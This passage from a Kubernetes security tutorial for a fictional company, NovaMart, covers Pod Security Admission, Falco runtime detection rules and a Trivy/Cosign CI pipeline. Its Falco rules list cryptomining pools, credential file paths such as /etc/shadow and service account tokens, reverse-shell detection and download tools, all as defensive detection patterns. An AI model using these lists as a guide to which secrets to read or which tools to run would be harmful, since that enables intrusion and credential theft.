        # Gatekeeper controller not running
        - alert: GatekeeperDown
          expr: |
            absent(up{job="gatekeeper-controller"} == 1)
          for: 2m
          labels:
            severity: critical
          annotations:
            summary: "Gatekeeper is down — admission policies not enforced"
```

---

## Part 2: Pod Security — Pod Security Standards (PSS) and Pod Security Admission (PSA)

### The Evolution

```text
PSP (PodSecurityPolicy) → DEPRECATED in K8s 1.21, REMOVED in 1.25
  Why removed: Complex, confusing, hard to debug, mutating behavior unexpected

PSA/PSS (Pod Security Admission / Pod Security Standards) → REPLACEMENT
  Built into Kubernetes (no webhook needed)
  Simpler: 3 predefined levels, applied per namespace
  Non-mutating: only validates, never changes your pod spec

THE KEY DIFFERENCE FROM GATEKEEPER:
  Gatekeeper: Custom policies, any logic, flexible → complex
  PSA/PSS: Three fixed levels, no customization → simple, built-in
  
  They COMPLEMENT each other:
  PSA = baseline enforcement (everyone gets this)
  Gatekeeper = custom policies on top (organization-specific rules)
```

### The Three Pod Security Standards Levels

```text
┌────────────┬───────────────────────────────────────────────────────────┐
│ Level      │ What It Restricts                                         │
├────────────┼───────────────────────────────────────────────────────────┤
│            │                                                           │
│ PRIVILEGED │ Nothing. Unrestricted. Full access.                       │
│            │ Use for: kube-system, monitoring (node-exporter),         │
│            │          Istio CNI, storage drivers                       │
│            │                                                           │
├────────────┼───────────────────────────────────────────────────────────┤
│            │ Prevents known privilege escalation vectors:              │
│ BASELINE   │ ❌ hostNetwork, hostPID, hostIPC                          │
│            │ ❌ privileged containers                                  │
│            │ ❌ Adding Linux capabilities (except: NET_BIND_SERVICE)   │
│            │ ❌ hostPath volumes                                       │
│            │ ❌ hostPort (by default)                                  │
│            │ ❌ /proc mount types other than Default                   │
│            │ ❌ Sysctls other than safe subset                         │
│            │ ❌ WindowsHostProcess                                     │
│            │ ✅ Allows: running as root, writable rootfs, all seccomp  │
│            │                                                           │
│            │ Use for: General workloads that need some flexibility     │
│            │                                                           │
├────────────┼───────────────────────────────────────────────────────────┤
│            │ Everything in Baseline PLUS:                              │
│ RESTRICTED │ ❌ Running as root (must set runAsNonRoot: true)          │
│            │ ❌ Writable root filesystem (in some strict               │
│            │    interpretations, though PSA doesn't enforce this)      │
│            │ ❌ ALL capabilities must be dropped (drop: ["ALL"])       │
│            │ ❌ Privilege escalation (allowPrivilegeEscalation: false) │
│            │ ❌ seccomp must be RuntimeDefault or Localhost            │
│            │ Must set: runAsNonRoot: true                              │
│            │ Must set: seccompProfile type                             │
│            │                                                           │
│            │ Use for: Hardened production workloads                    │
│            │          PCI-scoped services (payment-svc, fraud-svc)     │
└────────────┴───────────────────────────────────────────────────────────┘
```

### Pod Security Admission Modes

```text
PSA is applied PER NAMESPACE via labels.
Three MODES control what happens when a pod violates the level:

  enforce → BLOCK the pod from being created
  audit   → Allow creation but log the violation in audit log
  warn    → Allow creation but return a warning to the user

You can combine different modes with different levels:

EXAMPLE — Gradual enforcement:
  enforce: baseline    → Hard-block anything below baseline
  warn:    restricted  → Warn about restricted violations
  audit:   restricted  → Log all restricted violations

This means:
  - Pods that use hostNetwork are BLOCKED (baseline violation)
  - Pods running as root are ALLOWED but the user sees a WARNING
  - All restricted violations appear in the K8s audit log
  - When teams fix all warnings → switch enforce to restricted
```

### NovaMart PSA Configuration

```yaml
# Production application namespaces — enforce restricted
apiVersion: v1
kind: Namespace
metadata:
  name: payments
  labels:
    environment: production
    # PSA labels
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: v1.28
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: v1.28
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: v1.28

---
# General production namespaces — baseline enforce, restricted warn
apiVersion: v1
kind: Namespace
metadata:
  name: orders
  labels:
    environment: production
    pod-security.kubernetes.io/enforce: baseline
    pod-security.kubernetes.io/enforce-version: v1.28
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: v1.28
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: v1.28

---
# System namespaces — privileged (no restrictions)
apiVersion: v1
kind: Namespace
metadata:
  name: kube-system
  labels:
    pod-security.kubernetes.io/enforce: privileged
    pod-security.kubernetes.io/enforce-version: v1.28

---
# Monitoring namespace — privileged (node-exporter needs host access)
apiVersion: v1
kind: Namespace
metadata:
  name: monitoring
  labels:
    pod-security.kubernetes.io/enforce: privileged
    pod-security.kubernetes.io/enforce-version: v1.28
```

### What a Restricted-Compliant Pod Looks Like

```yaml
# This pod PASSES the "restricted" PSS level
apiVersion: v1
kind: Pod
metadata:
  name: payment-svc
  namespace: payments
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: payment-svc
      image: 888888888888.dkr.ecr.us-east-1.amazonaws.com/payment-svc:v2.3.1
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
      resources:
        requests:
          cpu: 250m
          memory: 512Mi
        limits:
          memory: 1Gi
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}  # Because rootfs is read-only, app needs writable /tmp
```

```text
COMMON PSA VIOLATIONS AND FIXES:

  "runAsNonRoot must be true"
    → Add: securityContext.runAsNonRoot: true at pod or container level
    → AND ensure the container image doesn't use USER root in Dockerfile

  "allowPrivilegeEscalation must be false"
    → Add: securityContext.allowPrivilegeEscalation: false

  "capabilities must be dropped"
    → Add: securityContext.capabilities.drop: ["ALL"]
    → If app needs NET_BIND_SERVICE (bind to port < 1024):
      capabilities: { drop: ["ALL"], add: ["NET_BIND_SERVICE"] }

  "seccompProfile must be set"
    → Add: securityContext.seccompProfile.type: RuntimeDefault
    → RuntimeDefault is the Docker/containerd default seccomp profile
    → Blocks ~40 dangerous syscalls (ptrace, mount, reboot, etc.)

  "readOnlyRootFilesystem causes app to crash"
    → App writes to /tmp, /var/cache, etc.
    → Mount emptyDir volumes at those paths
    → This is a GOOD pattern: immutable container + explicit writable paths
```

### PSA + Gatekeeper = Defense in Depth

```text
NovaMart uses BOTH:

  PSA (built-in):
    → Enforces baseline/restricted at namespace level
    → No extra components to manage
    → Catches the obvious security violations
    → Defined per-namespace via labels

  Gatekeeper (custom):
    → Enforces NovaMart-specific policies
    → Registry allowlist (can't do with PSA)
    → Required labels (can't do with PSA)
    → Resource limits (can't do with PSA)
    → Image tag restrictions (can't do with PSA)
    → Custom business logic

  Together: PSA handles the security basics.
  Gatekeeper handles the organizational requirements.
  Neither alone is sufficient.
```

---

## Part 3: Runtime Security — Falco

### Why Runtime Security Exists

```text
ADMISSION CONTROL (Gatekeeper, PSA) prevents BAD CONFIGURATIONS
from entering the cluster. But what about:

  1. An attacker exploiting a vulnerability in a RUNNING container?
  2. A compromised container downloading a reverse shell?
  3. A container reading /etc/shadow or accessing the K8s API?
  4. A process spawning unexpected child processes?
  5. A container making outbound connections to known C2 servers?

None of these are configuration issues. The pod spec looks perfect.
The RUNTIME BEHAVIOR is malicious.

This is the gap between "what was deployed" and "what's happening."
Falco fills this gap.
```

### Falco Architecture

```text
┌─────────────────────────────────────────────────────────────────────┐
│                         FALCO ARCHITECTURE                          │
│                                                                     │
│ ┌─────────────────────────────────────────────────────────────────┐ │
│ │ Linux Kernel                                                    │ │
│ │ ┌─────────────────────────────────────────────────────────────┐ │ │
│ │ │ Syscall Interface                                           │ │ │
│ │ │ open(), exec(), connect(), read()...                        │ │ │
│ │ └──────────────────────────────┬──────────────────────────────┘ │ │
│ │                                │                                │ │
│ │ ┌──────────────────────────────▼──────────────────────────────┐ │ │
│ │ │ eBPF probe (or kernel module)                               │ │ │
│ │ │ Captures syscalls with ZERO overhead on non-matching events │ │ │
│ │ └──────────────────────────────┬──────────────────────────────┘ │ │
│ └────────────────────────────────┼────────────────────────────────┘ │
│                                  │ Syscall events (raw)             │
│                                  ▼                                  │
│ ┌─────────────────────────────────────────────────────────────────┐ │
│ │ Falco Engine (userspace)                                        │ │
│ │                                                                 │ │
│ │ ┌────────────────────────┐                                      │ │
│ │ │ Rules Engine           │  YAML rules that                     │ │
│ │ │ (condition →           │  match syscall                       │ │
│ │ │  output → priority)    │  patterns                            │ │
│ │ └───────────┬────────────┘                                      │ │
│ │             │ Match!                                            │ │
│ │             ▼                                                   │ │
│ │ ┌────────────────────────┐                                      │ │
│ │ │ Output Engine          │                                      │ │
│ │ │ stdout, file,          │                                      │ │
│ │ │ syslog, gRPC,          │                                      │ │
│ │ │ HTTP webhook           │                                      │ │
│ │ └───────────┬────────────┘                                      │ │
│ └─────────────┼───────────────────────────────────────────────────┘ │
│               │                                                     │
│               ▼                                                     │
│ ┌─────────────────────────────────────────────────────────────────┐ │
│ │ Alert Pipeline                                                  │ │
│ │                                                                 │ │
│ │ Falco → Falcosidekick → PagerDuty                               │ │
│ │                       → Slack                                   │ │
│ │                       → Loki (log storage)                      │ │
│ │                       → OPA (auto-response)                     │ │
│ │                       → K8s (kill pod)                          │ │
│ └─────────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────┘

KEY POINTS:
  - Falco runs as a DaemonSet (one per node)
  - Uses eBPF probes (modern) or kernel module (legacy) to capture syscalls
  - eBPF is preferred: no kernel module loading needed, safer, dynamic
  - Rules are YAML files that describe suspicious syscall patterns
  - Falcosidekick handles alert routing (Falco itself has limited outputs)
  - Processing overhead: <1% CPU in eBPF mode for typical workloads
```

### Falco Deployment on EKS

```yaml
# Falco + Falcosidekick Helm installation
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set driver.kind=ebpf \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.config.slack.webhookurl="https://hooks.slack.com/services/..." \
  --set falcosidekick.config.slack.channel="#security-alerts" \
  --set falcosidekick.config.slack.minimumpriority="warning" \
  --set falcosidekick.config.pagerduty.routingKey="<key>" \
  --set falcosidekick.config.pagerduty.minimumpriority="critical" \
  --set falcosidekick.config.loki.hostPort="http://loki-gateway.monitoring:80" \
  --set falcosidekick.config.loki.minimumpriority="notice" \
  --set collectors.kubernetes.enabled=true \
  --set collectors.kubernetes.collectorHostname=true \
  --values falco-custom-rules.yaml

# driver.kind=ebpf:
#   Uses eBPF instead of kernel module
#   EKS AL2/Bottlerocket support eBPF natively
#   No need for kernel headers or DKMS

# collectors.kubernetes.enabled=true:
#   Enriches syscall events with Kubernetes metadata
#   (pod name, namespace, labels, container ID)
#   Without this, you only see PIDs and container IDs — useless for triage
```

### Falco Rules — How They Work

```yaml
# Falco rules have three components:
#   macro:     Reusable condition snippets
#   list:      Named arrays of values
#   rule:      The actual detection rule

# ANATOMY OF A RULE:
- rule: Terminal shell in container
  desc: Detect a shell (bash, sh, zsh) started inside a container
  condition: >
    spawned_process and
    container and
    shell_procs and
    not shell_allowed_container
  output: >
    Shell started in container
    (user=%user.name container=%container.name
     pod=%k8s.pod.name ns=%k8s.ns.name
     shell=%proc.name parent=%proc.pname
     cmdline=%proc.cmdline
     image=%container.image.repository)
  priority: WARNING
  tags:[container, shell, mitre_execution]
  
# Breaking it down:
#   condition: Boolean expression using Falco filter fields
#     spawned_process: macro for "evt.type = execve and evt.dir = <"
#     container: macro for "container.id != host"
#     shell_procs: list of [bash, sh, zsh, csh, ksh, dash]
#     not shell_allowed_container: exception for containers that legitimately use shells
#   
#   output: The alert message. Uses filter fields for enrichment.
#     %user.name, %container.name, %k8s.pod.name — all from kernel + K8s metadata
#   
#   priority: EMERGENCY, ALERT, CRITICAL, ERROR, WARNING, NOTICE, INFO, DEBUG
#   
#   tags: For filtering, routing, MITRE ATT&CK mapping
```

### NovaMart's Custom Falco Rules

```yaml
# NovaMart custom rules file (falco-custom-rules.yaml in Helm values)

customRules:
  novamart-rules.yaml: |

    # ============================================================
    # RULE 1: Cryptocurrency mining detection
    # ============================================================
    - list: mining_pools
      items:[
        "pool.minergate.com", "xmr.pool.minergate.com",
        "pool.hashvault.pro", "xmrpool.eu",
        "monerohash.com", "minexmr.com",
        "nanopool.org", "supportxmr.com"
      ]

    - list: mining_processes
      items:[
        xmrig, ccminer, cgminer, bfgminer, cpuminer,
        minerd, minergate, stratum
      ]

    - rule: Cryptocurrency mining detected
      desc: Container is communicating with known mining pools or running mining software
      condition: >
        (
          (spawned_process and container and proc.name in (mining_processes))
          or
          (evt.type in (connect, sendto) and container and
           fd.sip.name in (mining_pools))
        )
      output: >
        CRYPTOCURRENCY MINING DETECTED
        (process=%proc.name cmdline=%proc.cmdline
         connection=%fd.name
         container=%container.name pod=%k8s.pod.name
         ns=%k8s.ns.name node=%k8s.node.name
         image=%container.image.repository:%container.image.tag)
      priority: CRITICAL
      tags: [cryptomining, mitre_resource_hijacking]

    # ============================================================
    # RULE 2: Sensitive file access in container
    # ============================================================
    - list: sensitive_file_paths
      items:[
        /etc/shadow, /etc/passwd, /etc/sudoers,
        /root/.ssh, /root/.bash_history,
        /var/run/secrets/kubernetes.io/serviceaccount/token,
        /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
      ]

    - rule: Sensitive file read in container
      desc: Container reading files that indicate reconnaissance or credential theft
      condition: >
        open_read and
        container and
        fd.name in (sensitive_file_paths) and
        not proc.name in (kubelet, vault-agent, node_exporter)
      output: >
        Sensitive file read in container
        (file=%fd.name process=%proc.name user=%user.name
         container=%container.name pod=%k8s.pod.name
         ns=%k8s.ns.name image=%container.image.repository)
      priority: WARNING
      tags: [filesystem, mitre_credential_access, mitre_discovery]

    # ============================================================
    # RULE 3: Container drift detection — new executable written and run
    # ============================================================
    - rule: Container drift detected
      desc: >
        A new executable was written to the container filesystem
        and then executed. This indicates post-compromise activity
        (downloading and running malware, reverse shells, tools).
      condition: >
        spawned_process and
        container and
        proc.is_exe_writable=true
      output: >
        DRIFT DETECTED: New executable launched in container
        (process=%proc.name cmdline=%proc.cmdline
         exe=%proc.exepath parent=%proc.pname
         container=%container.name pod=%k8s.pod.name
         ns=%k8s.ns.name image=%container.image.repository)
      priority: CRITICAL
      tags:[drift, mitre_execution, mitre_persistence]
      # proc.is_exe_writable=true means the executable file was
      # modified AFTER the container started. It was NOT in the
      # original image. Something wrote it at runtime.

    # ============================================================
    # RULE 4: Reverse shell detection
    # ============================================================
    - rule: Reverse shell in container
      desc: Detect outbound connection by a shell process (reverse shell)
      condition: >
        evt.type in (connect, sendto) and
        evt.dir = < and
        container and
        fd.type = ipv4 and
        proc.name in (bash, sh, zsh, dash, csh) and
        fd.l4proto = tcp
      output: >
        REVERSE SHELL: Shell process making outbound connection
        (process=%proc.name cmdline=%proc.cmdline
         connection=%fd.name
         container=%container.name pod=%k8s.pod.name
         ns=%k8s.ns.name image=%container.image.repository)
      priority: CRITICAL
      tags:[network, shell, mitre_command_and_control]

    # ============================================================
    # RULE 5: Kubernetes API access from unexpected container
    # ============================================================
    - list: k8s_api_allowed_containers
      items:[
        "vault-agent", "external-secrets",
        "argocd-application-controller",
        "cert-manager", "kyverno",
        "istio-proxy", "gatekeeper-audit"
      ]

    - rule: Unexpected K8s API access
      desc: >
        Container accessing the Kubernetes API server that is not in
        the allowed list. May indicate lateral movement.
      condition: >
        evt.type in (connect, sendto) and
        container and
        fd.sip = "10.100.0.1" and
        not container.name in (k8s_api_allowed_containers) and
        not k8s.ns.name in (kube-system, gatekeeper-system)
      output: >
        Unexpected K8s API access
        (container=%container.name pod=%k8s.pod.name
         ns=%k8s.ns.name process=%proc.name
         cmdline=%proc.cmdline
         image=%container.image.repository)
      priority: ERROR
      tags:[k8s_api, mitre_discovery, mitre_lateral_movement]

    # ============================================================
    # RULE 6: Outbound connection to non-approved CIDR
    # ============================================================
    - rule: Unexpected outbound connection from PCI namespace
      desc: >
        Container in PCI-scoped namespace making outbound connection
        to an IP not in the approved egress list. PCI services should
        only communicate with known internal services and payment processors.
      condition: >
        evt.type in (connect, sendto) and
        evt.dir = < and
        container and
        k8s.ns.name in (payments, fraud) and
        fd.type = ipv4 and
        not (
          fd.sip startswith "10." or
          fd.sip startswith "172.16." or
          fd.sip startswith "192.168."
        ) and
        not fd.sip in ("52.14.183.110", "52.14.183.111")
      output: >
        PCI container making unexpected outbound connection
        (connection=%fd.name container=%container.name
         pod=%k8s.pod.name ns=%k8s.ns.name
         process=%proc.name image=%container.image.repository)
      priority: CRITICAL
      tags: [network, pci, mitre_exfiltration]
      # The hardcoded IPs would be Stripe/payment processor endpoints
      # In reality, use DNS-based egress policies via Istio

    # ============================================================
    # RULE 7: Package manager execution in production container
    # ============================================================
    - rule: Package manager in production container
      desc: >
        Package manager (apt, yum, apk) executed in a running
        container. Production containers should be immutable.
        This indicates either a compromised container installing
        tools or a developer debugging in production (both bad).
      condition: >
        spawned_process and
        container and
        proc.name in (apt, apt-get, yum, dnf, apk, pip, pip3, npm, gem, curl, wget) and
        k8s.ns.name in (payments, orders, search, notifications, cart, users, fraud)
      output: >
        Package manager or download tool in production container
        (process=%proc.name cmdline=%proc.cmdline
         container=%container.name pod=%k8s.pod.name
         ns=%k8s.ns.name user=%user.name
         image=%container.image.repository)
      priority: ERROR
      tags: [package_manager, mitre_execution, container_drift]
```

### Falco + Falcosidekick — Automated Response

```text
Falcosidekick isn't just an alert router. It can trigger AUTOMATED RESPONSES:

  ┌────────────────────────────────────────────────────────────┐
  │  Falco Alert (CRITICAL)                                    │
  │  "Cryptocurrency mining detected in orders namespace"      │
  └────────────────┬───────────────────────────────────────────┘
                   │
                   ▼
  ┌────────────────────────────────────────────────────────────┐
  │  Falcosidekick                                             │
  │                                                            │
  │  Route 1: → Slack #security-alerts (all priorities)        │
  │  Route 2: → PagerDuty (CRITICAL only → page on-call)       │
  │  Route 3: → Loki (all events → long-term storage + query)  │
  │  Route 4: → Kubernetes Response Engine                     │
  │            (auto-kill pod, auto-taint node, auto-label)    │
  └────────────────────────────────────────────────────────────┘
```

```yaml
# Falcosidekick automated response — kill compromised pods
# This uses the Kubernetes Response Engine (falco-talon or custom)

# Option 1: Falcosidekick Kubernetes output
# (Built into Falcosidekick — simple but limited)
falcosidekick:
  config:
    kubernetes:
      kubeconfig: ""  # In-cluster
      namespace: "falco"
      # Delete the offending pod when CRITICAL alert fires
      # The pod's controller (Deployment/RS) will recreate it clean
      minimumpriority: "critical"

# Option 2: Falco Talon (dedicated response engine)
# More sophisticated — supports multiple response types:
#
# responses:
#   - action: kubernetes:terminate
#     parameters:
#       grace_period_seconds: 0
#     match:
#       rules:
#         - "Cryptocurrency mining detected"
#         - "Reverse shell in container"
#         - "Container drift detected"
#
#   - action: kubernetes:label
#     parameters:
#       labels:
#         security.novamart.com/compromised: "true"
#     match:
#       rules:
#         - "Sensitive file read in container"
#
#   - action: kubernetes:networkpolicy
#     parameters:
#       # Apply a deny-all NetworkPolicy to isolate the pod
#       allow:[]
#     match:
#       rules:
#         - "Unexpected outbound connection from PCI namespace"

# CAUTION with automated kill:
# - False positives WILL kill legitimate pods
# - Start with labeling (for investigation) not killing
# - Only auto-kill for HIGH-CONFIDENCE rules (mining, reverse shells)
# - NEVER auto-kill in kube-system or monitoring namespaces
# - Always have the Deployment/StatefulSet controller to recreate
```

### Falco Failure Modes

```text
FAILURE 1: eBPF probe fails to load on EKS node
  CAUSE: Kernel version incompatible, BTF not available,
         node uses custom AMI without eBPF support
  SYMPTOM: Falco pod CrashLoopBackOff, logs show "driver loading failed"
  DEBUG:
    kubectl -n falco logs <falco-pod> | grep -i "driver\|probe\|ebpf"
    # Check kernel:
    kubectl debug node/<node-name> -it --image=ubuntu -- \
      uname -r && ls /sys/kernel/btf/vmlinux
  FIX:
    - Use EKS-optimized AMI (AL2023 or Bottlerocket) — both support eBPF
    - If custom AMI: ensure CONFIG_BPF=y, CONFIG_BPF_SYSCALL=y,
      CONFIG_BPF_JIT=y in kernel config
    - Fallback: driver.kind=module (kernel module) — but this requires
      kernel headers and is less safe

FAILURE 2: Falco misses events under high syscall load
  CAUSE: Ring buffer overflow — syscalls generated faster than Falco consumes
  SYMPTOM: Falco logs show "dropped events" counter increasing
  IMPACT: Security blind spots — attacks during high-load periods go undetected
  FIX:
    - Increase buffer size: --buf-size-preset=4 (default 2)
    - Tune rules: disable noisy low-value rules
    - Use adaptive sampling for high-volume syscalls (read/write)
    - Monitor: falco_events_dropped_total Prometheus metric
  ALERT:
    - alert: FalcoEventsDropped
      expr: rate(falco_events_dropped_total[5m]) > 0
      for: 5m
      labels:
        severity: warning

FAILURE 3: False positive storm overwhelms alert channels
  CAUSE: Rule too broad, new deployment triggers legitimate behavior
         that matches a rule
  SYMPTOM: Hundreds of Slack alerts, PagerDuty fatigue, team ignores alerts
  THIS IS THE #1 OPERATIONAL PROBLEM WITH FALCO.
  FIX:
    - Start with DEFAULT rules only (Falco ships with battle-tested defaults)
    - Add exceptions for known-good behavior:
      - rule: Terminal shell in container
        append: true
        condition: and not (k8s.ns.name = "debug" and container.name = "debug-tools")
    - Use priority levels aggressively:
      CRITICAL → PagerDuty (auto-response)
      WARNING  → Slack channel (human review within 1h)
      NOTICE   → Loki only (forensic record)
    - NEVER page on INFO/NOTICE rules
    - Review and tune rules weekly for the first month

FAILURE 4: Falco DaemonSet evicted under memory pressure
  CAUSE: Node under memory pressure, Falco doesn't have Guaranteed QoS
  SYMPTOM: Security monitoring disappears on the node under most stress
           (exactly when you need it most)
  FIX:
    - Set requests == limits (Guaranteed QoS)
    - Use high PriorityClass (system-node-critical or custom):
      priorityClassName: system-node-critical
    - Falco typical memory: 200-500Mi depending on rule count

FAILURE 5: Kubernetes metadata enrichment fails
  CAUSE: Falco can't reach the K8s API server, or RBAC is too restrictive
  SYMPTOM: Alerts show container IDs instead of pod names and namespaces
  IMPACT: Alerts are nearly useless for triage — "container abc123 has a shell"
          vs "payment-svc in payments namespace has a shell"
  FIX:
    - Ensure Falco ServiceAccount has RBAC to list/watch pods and namespaces:
      apiGroups: [""]
      resources:["pods", "namespaces", "nodes"]
      verbs: ["get", "list", "watch"]
    - Check: kubectl -n falco logs <falco-pod> | grep -i "k8s\|metadata"

FAILURE 6: Rule update causes Falco restart → brief security gap
  CAUSE: ConfigMap update triggers DaemonSet rolling restart
  SYMPTOM: Nodes briefly have no Falco coverage during rule updates
  FIX:
    - Falco supports hot-reload (SIGHUP or watch_config_files: true)
    - Use watch_config_files: true in falco.yaml to avoid restarts
    - If restart required: use DaemonSet maxUnavailable: 1 to limit gap
```

---

## Part 4: Supply Chain Security

### The Threat

```text
SUPPLY CHAIN ATTACKS target the SOFTWARE BUILD AND DELIVERY PROCESS,
not the running application:

  1. Compromised base image → Malware baked into your container
     (Example: Docker Hub images with cryptominers, 2022)

  2. Compromised dependency → Malicious library in your app
     (Example: event-stream npm package, 2018; SolarWinds, 2020;
      Log4Shell, 2021 — not supply chain but shows dependency risk)

  3. Compromised build system → Attacker modifies build output
     (Example: CodeCov breach, 2021 — CI credentials stolen)

  4. Typosquatting → Developer installs "pythonn-requests" instead of
     "python-requests" → runs attacker code

  5. Registry poisoning → Attacker pushes malicious image with
     same name as legitimate image

NovaMart's attack surface:
  - 200+ microservices, each with dozens of dependencies
  - 15+ base images
  - Public Docker Hub, npm, PyPI, Maven dependencies
  - Jenkins build system with access to production ECR
  - 85+ developers with commit access

ONE compromised dependency = potential access to production.
```

### The Supply Chain Security Stack

```text
┌─────────────────────────────────────────────────────────────────┐
│            SUPPLY CHAIN SECURITY — DEFENSE IN DEPTH             │
│                                                                 │
│ LAYER 1: SOURCE CODE                                            │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ • Dependency scanning (Snyk, Dependabot, Renovate)          │ │
│ │ • Lock files (package-lock.json, go.sum, requirements.txt)  │ │
│ │ • SBOM generation (Syft, cyclonedx)                         │ │
│ │ • License compliance scanning                               │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                             │                                   │
│ LAYER 2: BUILD              ▼                                   │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ • Hardened build environment (ephemeral, minimal)           │ │
│ │ • Pinned base images (digest, not tag)                      │ │
│ │ • Build provenance (SLSA framework)                         │ │
│ │ • Reproducible builds                                       │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                             │                                   │
│ LAYER 3: IMAGE              ▼                                   │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ • Vulnerability scanning (Trivy, Grype, Snyk)               │ │
│ │ • Image signing (Cosign/Sigstore)                           │ │
│ │ • SBOM attached to image (Syft + Cosign attest)             │ │
│ │ • Base image freshness (auto-rebuild on base update)        │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                             │                                   │
│ LAYER 4: REGISTRY           ▼                                   │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ • Private registry (ECR, no public pull in production)      │ │
│ │ • Immutable tags (ECR image tag immutability)               │ │
│ │ • Lifecycle policies (clean up untagged images)             │ │
│ │ • Registry scanning (ECR enhanced scanning)                 │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                             │                                   │
│ LAYER 5: ADMISSION          ▼                                   │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ • Signature verification at admission (Kyverno + Cosign)    │ │
│ │ • Registry allowlist (Gatekeeper)                           │ │
│ │ • Vulnerability threshold enforcement                       │ │
│ │ • SBOM policy enforcement                                   │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                             │                                   │
│ LAYER 6: RUNTIME            ▼                                   │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ • Container drift detection (Falco Rule 3 from above)       │ │
│ │ • Behavioral monitoring (expected vs actual syscalls)       │ │
│ │ • Read-only root filesystem enforcement                     │ │
│ └─────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

### Image Scanning — Trivy in CI/CD

```yaml
# Jenkins pipeline — scan image before push to ECR
# (This connects to Phase 3 — CI/CD pipeline security)

pipeline {
  agent any
  
  environment {
    ECR_REGISTRY = "888888888888.dkr.ecr.us-east-1.amazonaws.com"
    IMAGE_NAME = "payment-svc"
    IMAGE_TAG = "${GIT_COMMIT.take(8)}"
    TRIVY_SEVERITY = "CRITICAL,HIGH"
  }

  stages {
    stage('Build') {
      steps {
        sh "docker build -t ${ECR_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG} ."
      }
    }

    stage('Scan - Vulnerabilities') {
      steps {
        // Scan for vulnerabilities
        sh """
          trivy image \
            --severity ${TRIVY_SEVERITY} \
            --exit-code 1 \
            --ignore-unfixed \
            --no-progress \
            --format table \
            --output trivy-vuln-report.txt \
            ${ECR_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG}
        """
        // --exit-code 1: Fail the build if vulns found
        // --ignore-unfixed: Don't fail on vulns without patches
        //   (you can't fix what doesn't have a fix yet)
        // --severity: Only fail on CRITICAL and HIGH
      }
    }

    stage('Scan - Secrets') {
      steps {
        // Scan for leaked secrets in the image layers
        sh """
          trivy image \
            --scanners secret \
            --exit-code 1 \
            --format table \
            ${ECR_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG}
        """
      }
    }

    stage('Scan - Misconfigurations') {
      steps {
        // Scan Dockerfile for misconfigurations
        sh """
          trivy config \
            --exit-code 1 \
            --severity HIGH,CRITICAL \
            Dockerfile
        """
        // Catches: running as root, using ADD instead of COPY,
        //          no HEALTHCHECK, using :latest, etc.
      }
    }

    stage('Generate SBOM') {
      steps {
        sh """
          trivy image \
            --format cyclonedx \
            --output sbom.json \
            ${ECR_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG}
        """
        // CycloneDX is a standard SBOM format
        // Alternatively: --format spdx-json
        archiveArtifacts artifacts: 'sbom.json'
      }
    }

    stage('Push to ECR') {
      steps {
        // Only reached if all scans pass
        sh """
          aws ecr get-login-password --region us-east-1 | \
            docker login --username AWS --password-stdin ${ECR_REGISTRY}
          docker push ${ECR_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG}
        """
      }
    }

    stage('Sign Image') {
      steps {
        // Sign with Cosign (next section)
        sh """
          cosign sign \
            --key awskms:///arn:aws:kms:us-east-1:888888888888:key/signing-key-id \
            ${ECR_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG}
        """
      }
    }

    stage('Attach SBOM') {
      steps {
        // Attach SBOM as an attestation to the image
        sh """
          cosign attest \
            --key awskms:///arn:aws:kms:us-east-1:888888888888:key/signing-key-id \
            --predicate sbom.json \
            --type cyclonedx \
            ${ECR_REGISTRY}/${IMAGE_NAME}:${IMAGE_TAG}
        """
      }
    }
  }

  post {
    failure {
      slackSend channel: '#build-failures',
        color: 'danger',
        message: "Security scan failed for ${IMAGE_NAME}:${IMAGE_TAG}"
    }
  }
}
```

```text
TRIVY SCANNING MODES:
  trivy image    → Scan container image (OS packages + language deps)
  trivy fs       → Scan filesystem (source code dependencies)
  trivy config   → Scan IaC files (Dockerfile, K8s YAML, Terraform)
  trivy repo     → Scan Git repository
  trivy sbom     → Scan existing SBOM for vulnerabilities
  trivy k8s      → Scan running K8s cluster

TRIVY vs GRYPE vs SNYK:
  Trivy:  Free, fast, broad coverage, good for CI. NovaMart primary.
  Grype:  Free, Anchore ecosystem, good alternative.
  Snyk:   Commercial, developer-friendly, monitors deps over time.
          NovaMart uses Snyk for source-level dependency monitoring.
  BlackDuck: Commercial, license compliance focus. NovaMart uses for
             license auditing (GPL contamination detection).

SCANNING IS NOT ENOUGH:
  Scanning finds KNOWN vulnerabilities (CVEs in databases).
  It does NOT find:
    - Zero-day exploits
    - Intentional backdoors without CVEs
    - Logic bugs
    - Hardcoded credentials (use secret scanners for that)
  
  Scanning is Layer 3. You need all 6 layers.
```

